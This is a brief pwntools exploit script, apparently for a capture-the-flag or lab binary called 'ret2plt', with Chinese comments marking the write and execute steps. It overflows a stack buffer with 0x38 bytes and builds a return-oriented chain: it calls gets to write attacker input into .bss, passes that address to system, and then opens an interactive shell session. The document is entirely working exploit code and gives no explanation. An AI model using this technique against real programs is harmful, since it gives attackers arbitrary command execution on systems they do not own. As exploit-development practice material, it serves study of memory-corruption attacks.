from pwn import *

context(arch="amd64")

r=process('./ret2plt')

pop_rdi=p64(0x0000000000400733)
system=p64(0x0000000000400520)
gets=p64(0x0000000000400530)

bss=p64(0x601070)

r.sendline('a'*0x38+pop_rdi+
           bss+
           gets+ #寫入
           pop_rdi+
           bss+
           system) #執行

r.interactive()
